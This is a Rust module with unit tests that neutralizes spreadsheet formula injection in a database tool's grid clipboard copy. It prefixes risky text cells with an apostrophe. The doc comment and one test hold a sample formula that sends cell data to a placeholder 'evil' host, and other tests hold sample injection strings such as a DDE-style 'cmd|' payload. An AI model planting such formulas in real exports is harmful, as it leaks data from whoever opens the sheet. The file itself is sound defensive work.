//! Spreadsheet-formula neutralization for the data grid clipboard writers.
//!
//! #10542 neutralized formula injection in the CSV/TSV **file** exporters. The grid's
//! clipboard writers are a separate code path (`dbx_sql::data_grid_extractors`), so a
//! cell copied out of the grid and pasted into Excel was still emitted verbatim:
//! `=WEBSERVICE("https://evil")` executed on paste. This module closes that gap.
//!
//! The guard is applied to the **cell values before extraction** rather than to the
//! rendered output, so no delimited text has to be re-parsed. That keeps this module
//! free of any knowledge of separators, quote policies, the NULL sentinel, or
//! per-extractor escaping rules: the extractors keep owning all of that, and only the
//! text they are about to treat as a spreadsheet cell is prefixed.
//!
//! `dbx_sql_data` cannot depend on `dbx_formats` (the workspace enforces a one-way
//! boundary between those two leaf crates), so this shim lives one level up in
//! `dbx-core`, which already depends on `dbx-formats` and re-exports
//! `data_grid_extractors`. It calls the same `push_formula_guard` the file exporters
//! use, so the clipboard and file paths share one predicate and cannot drift.
//!
//! Only the extractors whose output lands in a spreadsheet are guarded. SQL, JSON,
//! XML, HTML, Markdown and the raw extractor must stay byte-exact: prefixing a SQL
//! statement or a JSON document would corrupt it.

use dbx_formats::csv_export::needs_formula_guard;
use dbx_sql::data_grid_extractors::{DataGridExtractRequest, DataGridExtractorId};
use serde_json::Value;

/// Extractors whose output is pasted straight into a spreadsheet cell grid.
///
/// TSV is the grid's default multi-cell copy and is the most exposed of these: Excel
/// evaluates any pasted field that starts with a trigger character. `PipeSeparated`
/// and `Dsv` are the same shape. The one-row and CSV writers are RFC4180 records, so
/// Excel treats their fields the same way.
fn is_spreadsheet_extractor(extractor: DataGridExtractorId) -> bool {
    matches!(
        extractor,
        DataGridExtractorId::Tsv
            | DataGridExtractorId::TsvWithHeaders
            | DataGridExtractorId::Csv
            | DataGridExtractorId::CsvWithHeaders
            | DataGridExtractorId::PipeSeparated
            | DataGridExtractorId::Dsv
            | DataGridExtractorId::OneRow
    )
}

/// Returns the request with spreadsheet-triggering text cells prefixed by `'`.
///
/// This is a no-op for every non-spreadsheet extractor, and for numbers, booleans and
/// NULL (which never start with a trigger character and must keep their JSON types so
/// the extractors' numeric formatting is unchanged). Negative decimal text cells
/// (drivers deliver DECIMAL/NUMERIC/BIGINT as strings) are also left alone: the shared
/// [`needs_formula_guard`] predicate exempts whole-string numeric literals, so a
/// copied `-1` stays `-1` while `-2+1+cmd|…` stays neutralized.
pub fn neutralize_spreadsheet_formulas(mut request: DataGridExtractRequest) -> DataGridExtractRequest {
    if !is_spreadsheet_extractor(request.extractor) {
        return request;
    }

    // Column headers are pasted into the same sheet and are plain strings.
    for column in &mut request.columns {
        if needs_formula_guard(&column.display_name) {
            column.display_name.insert(0, '\'');
        }
    }

    for row in &mut request.rows {
        for cell in row.iter_mut() {
            guard_string_cell(cell);
        }
    }

    request
}

/// Prefixes a text cell in place. Non-string values are left untouched: a JSON number
/// such as `-4` is data, not a formula, and the extractors already render it without
/// quotes. Arrays and objects are rendered as JSON by the extractors and start with
/// `[` or `{`, so they can never trigger a formula either.
fn guard_string_cell(cell: &mut Value) {
    let Value::String(text) = cell else {
        return;
    };
    if needs_formula_guard(text) {
        text.insert(0, '\'');
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use dbx_sql::data_grid_extractors::{DataGridExtractColumn, DataGridSelectionKind};
    use serde_json::json;

    fn request(extractor: DataGridExtractorId, rows: Vec<Vec<Value>>) -> DataGridExtractRequest {
        DataGridExtractRequest {
            version: dbx_sql::data_grid_extractors::DATA_GRID_EXTRACTOR_CONTRACT_VERSION,
            extractor,
            database_type: None,
            identifier_quote: None,
            table_meta: None,
            columns: vec![DataGridExtractColumn {
                display_name: "value".to_string(),
                source_name: Some("value".to_string()),
                source_index: 0,
            }],
            selected_column_indexes: vec![0],
            rows,
            selection_kind: DataGridSelectionKind::Cells,
            options: Default::default(),
        }
    }

    fn neutralize(extractor: DataGridExtractorId, rows: Vec<Vec<Value>>) -> Vec<Value> {
        neutralize_spreadsheet_formulas(request(extractor, rows)).rows.into_iter().flatten().collect()
    }

    #[test]
    fn spreadsheet_extractors_neutralize_every_trigger_character() {
        // The OWASP character set, plus the leading-space bypass it also documents.
        for value in ["=1+1", "+cmd", "-cmd", "@SUM(1)", "\tcmd", "\rcmd", " =cmd", "  -cmd"] {
            for extractor in [
                DataGridExtractorId::Tsv,
                DataGridExtractorId::TsvWithHeaders,
                DataGridExtractorId::Csv,
                DataGridExtractorId::CsvWithHeaders,
                DataGridExtractorId::PipeSeparated,
                DataGridExtractorId::Dsv,
                DataGridExtractorId::OneRow,
            ] {
                let out = neutralize(extractor, vec![vec![json!(value)]]);
                assert_eq!(out[0], json!(format!("'{value}")), "extractor {extractor:?} must neutralize {value:?}");
            }
        }
    }

    #[test]
    fn non_spreadsheet_extractors_stay_byte_exact() {
        // A leading apostrophe would corrupt SQL, JSON and markup.
        for extractor in [
            DataGridExtractorId::SqlInList,
            DataGridExtractorId::SqlInserts,
            DataGridExtractorId::SqlUpdates,
            DataGridExtractorId::SqlSelect,
            DataGridExtractorId::WhereClause,
            DataGridExtractorId::Json,
            DataGridExtractorId::JsonLines,
            DataGridExtractorId::Xml,
            DataGridExtractorId::Html,
            DataGridExtractorId::Markdown,
            DataGridExtractorId::Raw,
        ] {
            let out = neutralize(extractor, vec![vec![json!("=1+1")]]);
            assert_eq!(out[0], json!("=1+1"), "extractor {extractor:?} must not be guarded");
        }
    }

    #[test]
    fn text_without_a_trigger_character_is_untouched() {
        // A phone number written with a leading apostrophe is the common case the
        // exporter already doubles; here only the trigger set is neutralized.
        for value in ["plain", "a=b", "1'2", "'plain", "x@y.com", "", "NULL", "  plain"] {
            let out = neutralize(DataGridExtractorId::Tsv, vec![vec![json!(value)]]);
            assert_eq!(out[0], json!(value), "{value:?} must not be guarded");
        }
    }

    #[test]
    fn non_text_values_keep_their_json_type() {
        // Numbers must not gain an apostrophe: they are data, and the extractors
        // render them without quotes.
        let out = neutralize(
            DataGridExtractorId::Tsv,
            vec![vec![json!(-4), json!(0.5), json!(true), Value::Null, json!([1, -2])]],
        );
        assert_eq!(out[0], json!(-4));
        assert_eq!(out[1], json!(0.5));
        assert_eq!(out[2], json!(true));
        assert_eq!(out[3], Value::Null);
        assert_eq!(out[4], json!([1, -2]));
    }

    #[test]
    fn negative_decimal_text_cells_are_copied_verbatim() {
        // 回归：驱动把 DECIMAL/NUMERIC/BIGINT 以字符串下发（PG numeric、MySQL
        // DECIMAL 都是 Value::String），负值曾因 `-` 触发符被复制成 `'-1`。
        // 整串数字字面量豁免；超 Excel 15 位精度、`+` 号形态与注入载荷仍守卫。
        for extractor in [DataGridExtractorId::Tsv, DataGridExtractorId::Csv, DataGridExtractorId::PipeSeparated] {
            let out = neutralize(
                extractor,
                vec![vec![
                    json!("-1"),
                    json!("-123.45"),
                    json!("-9223372036854775808"),
                    json!("+8613800000000"),
                    json!("-2+1+cmd|'x'"),
                ]],
            );
            assert_eq!(out[0], json!("-1"), "extractor {extractor:?}");
            assert_eq!(out[1], json!("-123.45"), "extractor {extractor:?}");
            assert_eq!(out[2], json!("'-9223372036854775808"), "extractor {extractor:?}");
            assert_eq!(out[3], json!("'+8613800000000"), "extractor {extractor:?}");
            assert_eq!(out[4], json!("'-2+1+cmd|'x'"), "extractor {extractor:?}");
        }
    }

    #[test]
    fn grid_tsv_copy_of_a_negative_decimal_stays_a_plain_number() {
        // 端到端：多格复制（默认 smart → TSV）里负 decimal 文本不再带 `'`。
        let guarded = neutralize_spreadsheet_formulas(request(DataGridExtractorId::Tsv, vec![vec![json!("-1.23")]]));
        let result = dbx_sql::data_grid_extractors::extract_data_grid_selection(guarded).expect("TSV extraction");
        assert_eq!(result.text, "-1.23");
    }

    #[test]
    fn spreadsheet_headers_are_neutralized() {
        for extractor in [DataGridExtractorId::TsvWithHeaders, DataGridExtractorId::CsvWithHeaders] {
            let mut request = request(extractor, vec![vec![json!(1)]]);
            request.columns[0].display_name = "-total".to_string();
            let guarded = neutralize_spreadsheet_formulas(request);
            assert_eq!(guarded.columns[0].display_name, "'-total", "extractor {extractor:?}");
        }
    }

    #[test]
    fn non_spreadsheet_headers_are_untouched() {
        let mut request = request(DataGridExtractorId::SqlInserts, vec![vec![json!(1)]]);
        request.columns[0].display_name = "-total".to_string();
        let guarded = neutralize_spreadsheet_formulas(request);
        assert_eq!(guarded.columns[0].display_name, "-total");
    }

    /// End-to-end: what the clipboard writer actually emits. Without the guard this
    /// is what Excel evaluates on paste.
    #[test]
    fn grid_clipboard_output_no_longer_carries_an_executable_formula() {
        let payload = "=WEBSERVICE(\"https://evil/?d=\"&A1)";
        for (extractor, separator) in [(DataGridExtractorId::Tsv, "\t"), (DataGridExtractorId::PipeSeparated, "|")] {
            // The first cell is a plain id; the second is the injected formula.
            let mut request = request(extractor, vec![vec![json!(1), json!(payload)]]);
            request.columns[0].source_index = 0;
            request.selected_column_indexes = vec![0, 1];
            request.columns.push(DataGridExtractColumn {
                display_name: "formula".to_string(),
                source_name: Some("formula".to_string()),
                source_index: 1,
            });
            let guarded = neutralize_spreadsheet_formulas(request);
            let result = dbx_sql::data_grid_extractors::extract_data_grid_selection(guarded)
                .expect("plain delimited extraction");

            assert_eq!(result.text, format!("1{separator}'{payload}"));
            // The dangerous shape must no longer appear at the start of any field.
            assert!(
                !result.text.contains(&format!("{separator}{payload}")),
                "extractor {extractor:?} left an executable field: {:?}",
                result.text
            );
        }
    }

    /// The guard must not disturb the quoting rules the extractors already own.
    #[test]
    fn grid_clipboard_keeps_existing_escaping_and_null_behavior() {
        // TSV emits an embedded quote verbatim; the guard is orthogonal to that.
        let guarded = neutralize_spreadsheet_formulas(request(DataGridExtractorId::Tsv, vec![vec![json!(r#""abc""#)]]));
        let result = dbx_sql::data_grid_extractors::extract_data_grid_selection(guarded).expect("TSV extraction");
        assert_eq!(result.text, "\"abc\"");

        // NULL still becomes the bare sentinel, not a guarded string.
        let guarded = neutralize_spreadsheet_formulas(request(
            DataGridExtractorId::Csv,
            vec![vec![Value::Null], vec![json!("NULL")]],
        ));
        let result = dbx_sql::data_grid_extractors::extract_data_grid_selection(guarded).expect("CSV extraction");
        assert_eq!(result.text, "NULL\n\"NULL\"");

        // A negative number must stay a number: no apostrophe is added.
        let guarded = neutralize_spreadsheet_formulas(request(DataGridExtractorId::Tsv, vec![vec![json!(-4)]]));
        let result = dbx_sql::data_grid_extractors::extract_data_grid_selection(guarded).expect("TSV extraction");
        assert_eq!(result.text, "-4");
    }
}
